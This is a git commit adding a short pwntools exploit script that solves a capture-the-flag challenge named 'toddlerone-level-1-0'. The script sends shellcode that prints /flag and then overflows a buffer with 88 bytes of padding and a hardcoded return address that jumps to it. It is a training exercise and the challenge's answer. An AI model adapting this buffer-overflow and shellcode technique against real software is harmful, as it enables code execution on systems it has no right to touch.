3df1962f52448dbec468a6f59cc93b1a4f4b2727
Ernesto Pastori <43282001+ernepasto@users.noreply.github.com>
2025-04-06 09:36:46 +0200

    Update toddlerone-level-1-0.py

--- challenges/si/toddlerone-level-1-0.py
+++ challenges/si/toddlerone-level-1-0.py
@@ -1,1 +1,27 @@
+#!/usr/bin/python3
+from pwn import *
 
+'''
+-- OBIETTIVO DEL PROGRAMMA --
+
+-----------------------------
+'''
+
+context.log_level = 'CRITICAL'
+context.arch = 'amd64'
+
+elf = ELF('/challenge/toddlerone-level-1-0')
+p = elf.process()
+
+assembly = shellcraft.cat('/flag')
+shellcode = asm(assembly)
+
+buffer_addr = p64(0x28864000)
+
+delta_len = 88
+bytestream = b'A' * delta_len + buffer_addr
+
+p.sendline(shellcode)
+p.sendline(f'{len(bytestream)}'.encode())
+p.sendline(bytestream)
+p.interactive()
